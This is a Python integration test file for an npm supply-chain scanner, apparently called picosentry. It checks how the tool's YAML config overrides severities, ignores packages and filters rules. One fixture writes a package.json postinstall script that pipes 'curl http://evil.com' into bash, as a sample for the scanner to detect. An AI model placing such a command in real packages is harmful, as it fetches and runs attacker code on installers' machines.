"""
Integration tests for config file + CLI integration.

Tests that .picosentry.yml is loaded and merged with CLI args during scan.
"""

import json
import subprocess
import sys

from picosentry.scan.models import Severity

# ── Config file integration with scan ──


class TestConfigFileIntegration:
    """Test that .picosentry.yml config files are loaded and used during scans."""

    def test_config_severity_override_in_scan(self, tmp_path):
        """Config file severity overrides are applied during scan."""
        # Create a project with a provencance issue (normally LOW severity)
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "test-pkg",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "echo hello"},
                }
            )
        )

        # Config: override L2-POST-001 to MEDIUM
        config_file = project / ".picosentry.yml"
        config_file.write_text("version: 1\nseverity_overrides:\n  L2-POST-001: MEDIUM\nformat: json\n")

        # Run scan with config
        from picosentry.scan.config import load_config
        from picosentry.scan.engine import create_default_engine

        config = load_config(project)
        engine = create_default_engine()
        result = engine.scan(project, rules=config.rules)

        # Apply severity overrides
        if config.severity_overrides:
            result.findings = config.apply_severity_overrides(result.findings)
            result.recompute_stats()

        # L2-POST-001 finding should now be MEDIUM instead of CRITICAL
        post_findings = [f for f in result.findings if f.rule_id == "L2-POST-001"]
        for f in post_findings:
            assert f.severity == Severity.MEDIUM, f"Expected MEDIUM, got {f.severity}"

    def test_config_ignore_packages_in_scan(self, tmp_path):
        """Config file ignore_packages filters findings during scan."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "test-pkg",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "echo hello"},
                }
            )
        )

        # Config: ignore test-pkg
        config_file = project / ".picosentry.yml"
        config_file.write_text("version: 1\nignore_packages:\n  - test-pkg\n")

        from picosentry.scan.config import load_config
        from picosentry.scan.engine import create_default_engine

        config = load_config(project)
        engine = create_default_engine()
        result = engine.scan(project, rules=config.rules)

        # Apply ignore filters
        if config.ignore_packages or config.ignore_paths:
            result.findings = [
                f
                for f in result.findings
                if not config.should_ignore_package(f.package) and not config.should_ignore_path(f.file)
            ]
            result.recompute_stats()

        # No findings for test-pkg
        assert all(f.package != "test-pkg" for f in result.findings)

    def test_config_rules_filter_in_scan(self, tmp_path):
        """Config file rules filter limits which rules run during scan."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "test-pkg",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "echo hello"},
                }
            )
        )

        # Config: only run POST-001
        config_file = project / ".picosentry.yml"
        config_file.write_text("version: 1\nrules:\n  - L2-POST-001\n")

        from picosentry.scan.config import load_config
        from picosentry.scan.engine import create_default_engine

        config = load_config(project)
        engine = create_default_engine()
        result = engine.scan(project, rules=config.rules)

        # Only POST-001 findings
        assert all(f.rule_id == "L2-POST-001" for f in result.findings)

    def test_no_config_file_uses_defaults(self, tmp_path):
        """Scan without config file uses all defaults."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "test-pkg",
                    "version": "1.0.0",
                }
            )
        )

        from picosentry.scan.config import load_config

        config = load_config(project)
        assert config.format == "table"
        assert config.rules is None
        assert config.severity_overrides == {}
        assert config.ignore_packages == []

    def test_config_format_json(self, tmp_path):
        """Config file can set default format to json."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "test-pkg",
                    "version": "1.0.0",
                }
            )
        )

        config_file = project / ".picosentry.yml"
        config_file.write_text("version: 1\nformat: json\n")

        from picosentry.scan.config import load_config

        config = load_config(project)
        assert config.format == "json"

    def test_config_deterministic_with_same_file(self, tmp_path):
        """Same config file always produces same scan results."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "test-pkg",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )

        config_file = project / ".picosentry.yml"
        config_file.write_text("version: 1\nformat: json\nseverity_overrides:\n  L2-POST-001: HIGH\n")

        from picosentry.scan.config import load_config
        from picosentry.scan.engine import create_default_engine

        config_a = load_config(project)
        config_b = load_config(project)

        engine = create_default_engine()
        result_a = engine.scan(project, rules=config_a.rules)
        result_b = engine.scan(project, rules=config_b.rules)

        result_a.findings = config_a.apply_severity_overrides(result_a.findings)
        result_b.findings = config_b.apply_severity_overrides(result_b.findings)

        # Duration and per-rule timings are non-deterministic
        dict_a = result_a.to_dict()
        dict_b = result_b.to_dict()
        dict_a["stats"].pop("duration_ms", None)
        dict_b["stats"].pop("duration_ms", None)
        dict_a["stats"].pop("rule_timings_ms", None)
        dict_b["stats"].pop("rule_timings_ms", None)
        # rule_status contains per-rule duration_ms which varies between runs
        dict_a.pop("rule_status", None)
        dict_b.pop("rule_status", None)
        dict_a.pop("scan_completeness", None)
        dict_b.pop("scan_completeness", None)
        # audit timestamps vary between runs
        dict_a.pop("audit", None)
        dict_b.pop("audit", None)
        assert dict_a == dict_b


# ── CLI subprocess integration ──


class TestCLIWithConfig:
    """Test CLI with config file via subprocess."""

    def test_scan_with_config_file(self, tmp_path):
        """picosentry scan loads .picosentry.yml from target directory."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "test-pkg",
                    "version": "1.0.0",
                }
            )
        )

        # Config: format json, no color
        config_file = project / ".picosentry.yml"
        config_file.write_text("version: 1\nformat: json\nno_color: true\n")

        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--format", "json", "--no-color"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        # Should produce valid JSON output
        data = json.loads(result.stdout)
        assert "scan_id" in data
        assert "findings" in data


# ── Config file examples for README ──


class TestConfigExamples:
    """Verify the config file examples from README work correctly."""

    def test_minimal_config(self, tmp_path):
        project = tmp_path / "project"
        project.mkdir()
        config_file = project / ".picosentry.yml"
        config_file.write_text("version: 1\n")

        from picosentry.scan.config import load_config

        config = load_config(project)
        assert config.format == "table"  # default
        assert config.rules is None  # all rules

    def test_full_config(self, tmp_path):
        project = tmp_path / "project"
        project.mkdir()
        config_file = project / ".picosentry.yml"
        config_file.write_text(
            "version: 1\n"
            "format: json\n"
            "no_color: true\n"
            "exit_code: true\n"
            "fail_on: high\n"
            "baseline: baseline.json\n"
            "severity_overrides:\n"
            "  L2-PROV-001: INFO\n"
            "  L2-FORK-001: LOW\n"
            "ignore_packages:\n"
            "  - left-pad\n"
            "  - core-js\n"
            "ignore_paths:\n"
            "  - 'vendor/**'\n"
            "  - '**/test/**'\n"
            "rules:\n"
            "  - L2-POST-001\n"
            "  - L2-TYPO-001\n"
        )

        from picosentry.scan.config import load_config

        config = load_config(project)
        assert config.format == "json"
        assert config.no_color is True
        assert config.exit_code is True
        assert config.fail_on == "high"
        assert config.baseline is not None
        assert config.severity_overrides == {"L2-PROV-001": "INFO", "L2-FORK-001": "LOW"}
        assert config.ignore_packages == ["left-pad", "core-js"]
        assert config.ignore_paths == ["vendor/**", "**/test/**"]
        assert config.rules == ["L2-POST-001", "L2-TYPO-001"]
